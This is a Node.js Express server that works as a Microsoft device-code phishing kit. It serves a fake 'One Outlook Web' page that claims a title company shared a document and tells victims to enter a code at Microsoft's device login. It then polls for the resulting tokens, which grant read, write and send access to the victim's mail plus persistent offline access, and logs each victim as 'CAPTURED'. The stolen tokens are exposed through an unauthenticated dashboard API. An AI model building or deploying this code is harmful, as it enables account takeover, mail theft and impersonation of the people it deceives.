const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// IMPORTANT: Replace with YOUR Azure App Client ID
// Create one at https://portal.azure.com -> App registrations -> New registration
// Select "Accounts in any organizational directory and personal Microsoft accounts"
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

let sessions = new Map();
let pendingAuth = new Map();

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

// ============================================
// API: Create a new device code session
// ============================================
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        console.log(`[CREATE] SID: ${sid}, Code: ${user_code}`);
        
        pendingAuth.set(device_code, {
            device_code,
            user_code,
            sid,
            status: 'pending',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling for token
        pollForToken(device_code, sid);
        
        res.json({
            success: true,
            sid: sid,
            user_code: user_code
        });
        
    } catch (err) {
        console.error('Create session error:', err.response?.data || err.message);
        res.status(500).json({ 
            error: 'Failed to create session: ' + (err.response?.data?.error_description || err.message) 
        });
    }
});

// ============================================
// Background polling for token
// ============================================
async function pollForToken(device_code, sid) {
    console.log(`[POLLING] Started for SID: ${sid}`);
    
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            console.log(`[POLLING] SID ${sid} expired`);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            console.log(`[POLLING] Token received for SID: ${sid}`);
            
            // Get user info from Microsoft Graph
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const sessionData = {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                userId: userInfo.data.id,
                tokens: tokens,
                capturedAt: new Date().toISOString()
            };
            
            sessions.set(sid.toString(), sessionData);
            pending.status = 'captured';
            pending.email = sessionData.email;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ CAPTURED: ${sessionData.email} (SID: ${sid}) ✅✅✅`);
            
        } catch (err) {
            // authorization_pending is normal - just waiting for user
            if (err.response?.data?.error !== 'authorization_pending') {
                // Silent waiting
            }
        }
    }, 3000);
}

// ============================================
// API: Check authentication status
// ============================================
app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    
    // Check if already captured
    const session = sessions.get(sid);
    if (session) {
        return res.json({ 
            status: 'captured', 
            email: session.email,
            name: session.name 
        });
    }
    
    // Check pending
    for (const [device_code, pending] of pendingAuth.entries()) {
        if (pending.sid.toString() === sid) {
            return res.json({ status: pending.status });
        }
    }
    
    res.json({ status: 'not_found' });
});

// ============================================
// API: Get all sessions for dashboard
// ============================================
app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(sessions.values()).map(s => ({
        sid: s.sid,
        email: s.email,
        name: s.name,
        capturedAt: s.capturedAt
    }));
    console.log(`📊 Returning ${sessionList.length} sessions`);
    res.json({ sessions: sessionList });
});

// ============================================
// API: Get session token
// ============================================
app.get('/api/session/token/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = sessions.get(sid);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({
        email: session.email,
        token: session.tokens.access_token,
        expires_in: session.tokens.expires_in
    });
});

// ============================================
// API: Clear all sessions
// ============================================
app.delete('/api/sessions/clear', async (req, res) => {
    sessions.clear();
    console.log('🗑️ All sessions cleared');
    res.json({ success: true });
});

// ============================================
// Generate Authentication Page
// ============================================
app.get('/generate-auth-page', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        pendingAuth.set(device_code, {
            device_code,
            user_code,
            sid,
            status: 'pending',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>One Outlook Web - Secure Access</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #0078d4 0%, #00a4ef 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 520px;
            width: 100%;
        }
        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            overflow: hidden;
        }
        #mainView {
            padding: 40px;
            text-align: center;
        }
        .logo {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #0078d4, #00a4ef);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }
        .logo svg {
            width: 30px;
            height: 30px;
            fill: white;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #2b2b2b;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 30px;
        }
        .code-box {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
        }
        .code-label {
            font-size: 12px;
            color: #6b7280;
            margin-bottom: 8px;
        }
        .code {
            font-size: 38px;
            font-weight: bold;
            letter-spacing: 8px;
            background: white;
            padding: 15px;
            border-radius: 10px;
            color: #0078d4;
            font-family: 'Courier New', monospace;
            border: 1px solid #e5e7eb;
        }
        .btn {
            background: #0078d4;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 8px;
            transition: transform 0.2s;
            display: inline-block;
        }
        .btn:hover {
            transform: translateY(-2px);
            background: #005fa3;
        }
        .btn-outline {
            background: white;
            color: #0078d4;
            border: 1px solid #0078d4;
        }
        .btn-outline:hover {
            background: #f0f7ff;
        }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            background: #f8f9fa;
            color: #6b7280;
        }
        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #e5e7eb;
            border-top-color: #0078d4;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .steps {
            text-align: left;
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            font-size: 12px;
            color: #6b7280;
        }
        .steps ol {
            padding-left: 20px;
            margin-top: 8px;
        }
        .steps li {
            margin: 6px 0;
        }
        .steps strong {
            color: #0078d4;
        }
        #successBox {
            display: none;
            text-align: center;
            padding: 40px;
        }
        .success-icon {
            width: 64px;
            height: 64px;
            background: #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }
        .success-icon svg {
            width: 32px;
            height: 32px;
            fill: white;
        }
        #successBox h2 {
            font-size: 24px;
            color: #2b2b2b;
            margin-bottom: 10px;
        }
        #successBox p {
            font-size: 14px;
            color: #6b7280;
            margin-bottom: 20px;
        }
        .footer {
            padding: 16px;
            font-size: 11px;
            color: #9ca3af;
            text-align: center;
            border-top: 1px solid #e5e7eb;
            background: white;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div id="mainView">
            <div class="logo">
                <svg viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 13c-2.33 0-4.31-1.46-5.11-3.5h10.22c-.8 2.04-2.78 3.5-5.11 3.5z"/>
                </svg>
            </div>
            <h1>One Outlook Web</h1>
            <p class="subtitle">Encompass Title Center shared a document with you</p>
            
            <div class="code-box">
                <div class="code-label">Verification Code</div>
                <div class="code" id="userCode">${user_code}</div>
            </div>
            
            <button class="btn" onclick="copyCode()">📋 Copy Code</button>
            <button class="btn" id="openBtn">🔑 Open Microsoft Login</button>
            
            <div class="steps">
                <strong>📋 Steps to view:</strong>
                <ol>
                    <li>Click <strong>"Open Microsoft Login"</strong> above</li>
                    <li>Enter the code: <strong>${user_code}</strong></li>
                    <li>Sign in with your Microsoft account</li>
                    <li>Click <strong>"Continue"</strong> when asked</li>
                    <li>Return here - access will be granted</li>
                </ol>
            </div>
            
            <div class="status" id="statusMsg">
                <span class="spinner"></span> Preparing secure access...
            </div>
        </div>
        
        <div id="successBox">
            <div class="success-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                </svg>
            </div>
            <h2>Document access granted</h2>
            <p>You now have access. This window will close automatically.</p>
            <button class="btn" onclick="window.close()">Close Window</button>
        </div>
        
        <div class="footer">
            Secured with Microsoft Authentication · One Outlook Web
        </div>
    </div>
</div>

<script>
    const SID = ${sid};
    const API_BASE = '${req.protocol}://${req.get('host')}';
    
    function copyCode() {
        const code = document.getElementById('userCode').textContent;
        navigator.clipboard.writeText(code);
        alert('✓ Code copied!');
    }
    
    // CORRECT URL - This works properly
    document.getElementById('openBtn').onclick = function(e) {
        e.preventDefault();
        window.open('https://microsoft.com/devicelogin', 'mslogin', 'width=600,height=700,resizable=yes');
        return false;
    };
    
    async function pollStatus() {
        try {
            const response = await fetch(API_BASE + '/api/status/' + SID);
            const data = await response.json();
            
            if (data.status === 'captured') {
                document.getElementById('statusMsg').innerHTML = '✅ Access granted! You may close this window.';
                document.getElementById('mainView').style.display = 'none';
                document.getElementById('successBox').style.display = 'block';
                setTimeout(() => window.close(), 3000);
                return;
            }
            if (data.status === 'expired') {
                document.getElementById('statusMsg').innerHTML = 'Session expired. Refreshing...';
                setTimeout(() => location.reload(), 2000);
                return;
            }
        } catch(e) {
            console.error('Poll error:', e);
        }
        setTimeout(pollStatus, 3000);
    }
    
    pollStatus();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        console.error('Generate page error:', err.message);
        res.status(500).send('Error generating auth page: ' + err.message);
    }
});

// ============================================
// Serve Dashboard
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================
// Start Server
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Dashboard: http://localhost:${PORT}`);
    console.log(`📍 Generate Auth Page: http://localhost:${PORT}/generate-auth-page`);
    console.log(`========================================\n`);
});
